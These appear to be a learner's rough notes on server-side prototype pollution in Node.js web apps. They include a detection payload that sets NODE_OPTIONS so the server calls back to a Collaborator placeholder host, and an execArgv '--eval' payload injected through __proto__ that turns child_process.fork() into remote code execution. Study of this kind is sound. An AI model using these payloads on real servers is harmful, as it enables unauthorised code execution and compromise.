client side protoype pollution can only lead to DOM xss
wherea as server side hash capability to cause RCE

how to find if we can cause an RCE to webapp running RCE
There are a number of potential command execution sinks in Node, many of which occur in the child_process module

best way to identify these requests is by polluting the prototype with a payload that triggers 
an interaction with Burp Collaborator when called.

NODE_OPTIONS is an envronment variable in node applciations it can be leveraged to use for prototype pollution

eg:-- this paylaod acan be used to detect server side prototype pollution that can cause RCE                  --------------->>>> DETECTION
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
try to chhange proto to construcrtor if not works

EXPLOITING METHOD 1+++++++++++++++++++++++++++++++++++++++++++++++++++++++
Remote code execution via child_process.fork()
if developer is using chil_process.fork() method we can use 
"execArgv": [
    "--eval=require('<module>')"
]   ------> this is to be added in __proto__
method which acceptsjavascript code that can be executed on ther server
that cab be leveraged to condunct RCE
